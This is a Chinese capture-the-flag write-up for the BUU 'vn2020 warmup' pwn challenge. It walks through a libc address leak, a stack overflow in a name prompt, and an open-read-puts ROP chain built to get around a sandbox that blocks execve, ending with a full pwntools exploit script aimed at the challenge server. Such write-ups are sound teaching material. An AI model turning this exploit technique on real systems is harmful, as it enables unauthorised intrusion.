# BUU-vn2020-warmup

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## IDA

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_80A(a1, a2, a3);
  puts("This is a easy challange for you.");
  printf("Here is my gift: 0x%llx\n", &puts);
  sub_84D();//沙箱，禁用write和exceve
  sub_9D3();
  return 0LL;
}

int sub_9D3()
{
  char buf[384]; // [rsp+0h] [rbp-180h] BYREF

  printf("Input something: ");
  read(0, buf, 0x180uLL);
  sub_9A1();
  return puts("Done!");
}

ssize_t sub_9A1()
{
  char buf[112]; // [rsp+0h] [rbp-70h] BYREF

  printf("What's your name?");
  return read(0, buf, 0x80uLL);
}
```

给了我们puts的地址，我们可以以此来确定libc基址。但是由于不能get shell，所以要构造orw的ROP。开启了PIE保护，选择在libc中找gadget，在name处可以溢出，覆盖返回地址和rbp。

注意到，`sub_9A1`的栈应该在`sub_9D3`的下方，且两者是调用关系，`sub_9A1`的buf的栈应该与`sub_9D3`相邻，所以我们只要让栈再ret到`sub_9D3`的buf里就可以，通过覆盖返回地址为`pop_rdi_ret`，最后ret到ROP处。

`open`函数还需要一个`flag`字符串，由于程序的位置是随机的，我们将这个字符串写在栈上，例如`free_hook`

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
#context.log_level="DEBUG"
#context.arch="amd64"

local=0
binary='./vn_pwn_warmup'
#gdb.attach(sh)
# if local:
# 	sh=process(binary)
# else:
# 	sh=remote('node3.buuoj.cn',27261)

elf = ELF(binary,checksec=False)
while True:
	sh=remote('node3.buuoj.cn',28653)
	sh.recvuntil('gift: ') 
	puts_addr=int(sh.recvuntil('\n'),16)
	libc=ELF("libc6_2.23-0ubuntu10_amd64.so",checksec=False)
	libcbase=puts_addr-libc.symbols['puts']
	leak('libc base',libcbase)

	pop_rdi=libcbase+0x21102
	pop_rsi=libcbase+0x202e8
	pop_rdx=libcbase+0x1b92
	open_addr=libcbase+libc.sym['open']
	free_hook=libcbase+libc.sym['__free_hook']
	read_addr=libcbase+libc.sym['read']
	puts_addr=libcbase+libc.sym['puts']

	payload=p64(0)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(4)+p64(read_addr)
	payload+=p64(pop_rdi)+p64(free_hook)+p64(pop_rsi)+p64(4)+p64(open_addr)
	payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(free_hook)+p64(pop_rdx)+p64(0x30)+p64(read_addr)
	payload+=p64(pop_rdi)+p64(free_hook)+p64(puts_addr)
	try:
		sh.sendafter("Input something: ",payload)
		sh.sendafter("What's your name?",'a'* 0x78+p64(pop_rdi))
		sh.send("./flag")
		flag = sh.recv()
		if 'flag' in flag:
			print(flag)
	except:
		sh.close()
		continue
```

